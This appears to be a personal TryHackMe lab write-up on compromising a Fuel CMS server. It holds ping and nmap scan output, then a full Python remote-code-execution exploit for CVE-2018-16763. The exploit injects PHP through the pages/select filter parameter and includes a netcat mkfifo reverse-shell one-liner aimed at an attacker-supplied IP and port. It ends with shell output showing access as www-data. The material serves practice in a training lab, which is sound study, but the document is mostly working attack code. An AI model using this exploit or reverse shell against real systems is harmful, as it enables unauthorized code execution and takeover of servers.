---
date: 2024-12-27T15:59:00
tags:
  - "#TryHackMe"
link:
---
# Steps:
### First step is check that the system is working or not 
```c
┌─[✗]─[ghost@parrot]─[~]
└──╼ $ping -c 5 10.10.187.72
PING 10.10.187.72 (10.10.187.72) 56(84) bytes of data.
64 bytes from 10.10.187.72: icmp_seq=1 ttl=60 time=161 ms
64 bytes from 10.10.187.72: icmp_seq=2 ttl=60 time=161 ms
64 bytes from 10.10.187.72: icmp_seq=3 ttl=60 time=159 ms
64 bytes from 10.10.187.72: icmp_seq=4 ttl=60 time=160 ms
64 bytes from 10.10.187.72: icmp_seq=5 ttl=60 time=162 ms

--- 10.10.187.72 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4005ms
rtt min/avg/max/mdev = 158.758/160.583/161.982/1.103 ms
┌─[ghost@parrot]─[~]

```
### Nmap SCAN
```js
┌─[ghost@parrot]─[~]
└──╼ $nmap -sS -sV -vv 10.10.187.72
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 16:27 IST
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 16:27
Scanning 10.10.187.72 [4 ports]
Completed Ping Scan at 16:27, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:27
Completed Parallel DNS resolution of 1 host. at 16:27, 0.02s elapsed
Initiating SYN Stealth Scan at 16:27
Scanning 10.10.187.72 [1000 ports]
Discovered open port 80/tcp on 10.10.187.72
Discovered open port 22/tcp on 10.10.187.72
Completed SYN Stealth Scan at 16:27, 1.86s elapsed (1000 total ports)
Initiating Service scan at 16:27
Scanning 2 services on 10.10.187.72
Completed Service scan at 16:27, 6.35s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.187.72.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.71s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.63s elapsed
Nmap scan report for 10.10.187.72
Host is up, received reset ttl 60 (0.16s latency).
Scanned at 2024-12-27 16:27:33 IST for 10s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
           Raw packets sent: 1006 (44.240KB) | Rcvd: 1001 (40.048KB)

```

### Exploit:

```python
#!/usr/bin/python3

# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763
# 
# Poc Created by Ac1d (assassin) 



import requests
import sys
import urllib

from requests.sessions import extract_cookies_to_jar

class col:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"


def banner():
    banner = r"""
 ______         _ _____ ___  ___ _____ 
|  ___|        | /  __ \|  \/  |/  ___|
| |_ _   _  ___| | /  \/| .  . |\ `--. 
|  _| | | |/ _ \ | |    | |\/| | `--. \
| | | |_| |  __/ | \__/\| |  | |/\__/ /
\_|  \__,_|\___|_|\____/\_|  |_/\____/ 
Tested on 1.4                                       
"""
    banner += "Created by Ac1d"
    return col.LIGHT_BLUE + banner + col.RESET


def help():
    banner = col.LIGHT_WHITE + "\n\tMenu\n"
    banner += col.LIGHT_GREEN
    banner += "\nexit     -\tExit app"
    banner += "\nshell_me -\tGet a reverse shell (netcat) "
    banner += "\nhelp     -\tShow this help\n"+ col.RESET
    return banner
    


print(banner())
print(help())

#http://10.10.12.27/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27ls%20-la%27)%2B%27

if len(sys.argv) != 2:
    print("\nUsage: python3 exploit.py Vulnerable IPADDRESS")
    sys.exit(0)

IP=sys.argv[1]

def parsePage(page):
    try:            
        page = page.split("<h4>A PHP Error was encountered</h4>")[0]
        page = page.split("<div")[0]
        page = page[6:]
        return page
    except:
        return False

try:
        
    while True:
        cmd = input(col.LIGHT_WHITE +"fuelCMS$ " + col.RESET)

        if cmd[0:4].lower() == "exit":
            print(col.RED + "Exiting..." + col.RESET)
            sys.exit(0)

        if cmd[0:8] == "shell_me":
            IP2, PORT = input(col.LIGHT_BLUE + "Enter your attacking machine IP:PORT $ " + col.RESET).split(":")
            nc = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP2} {PORT} >/tmp/f"
            cmd = nc
            print(col.LIGHT_GREEN + "\nHope you had your listener ready!!" + col.RESET)
            
        if cmd[0:4] == "help":
            print(help())
            continue
        
        if not "/tmp/f;mkfifo" in cmd:
            print(col.LIGHT_GRAY + "Sending request." + col.RESET)
        cmd = urllib.parse.quote(cmd)
        r = requests.get(f"http://{IP}/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27"+ cmd +"%27)%2B%27")
        if r.status_code == 200:
            page = parsePage(r.text)
            if page == "\n":
                print(col.RED + "No result" + col.RESET)
                continue
            print(col.LIGHT_GREEN+ f"\n{page.strip()}" + col.RESET)

except Exception as e:
    print(col.RED + f"An error occured, please try again...\n\n{e}" + col.RESET)
    
```

### Gaining: 
```c
$ ls -all
total 56
drwxr-xr-x 4 www-data www-data  4096 Sep  3  2021 .
drwxr-xr-x 3 root     root      4096 Sep  3  2021 ..
-rwxr-xr-x 1 www-data www-data    39 Sep  3  2021 .gitignore
-rwxr-xr-x 1 www-data www-data   718 Sep  3  2021 .htaccess
-rwxr-xr-x 1 www-data www-data  1427 Sep  3  2021 README.md
drwxr-xr-x 9 www-data www-data  4096 Sep  3  2021 assets
-rwxr-xr-x 1 www-data www-data   193 Sep  3  2021 composer.json
-rwxr-xr-x 1 www-data www-data  6502 Sep  3  2021 contributing.md
drwxr-xr-x 9 www-data www-data  4096 Sep  3  2021 fuel
-rwxr-xr-x 1 www-data www-data 11802 Sep  3  2021 index.php
-rwxr-xr-x 1 www-data www-data    30 Sep  3  2021 robots.txt
```


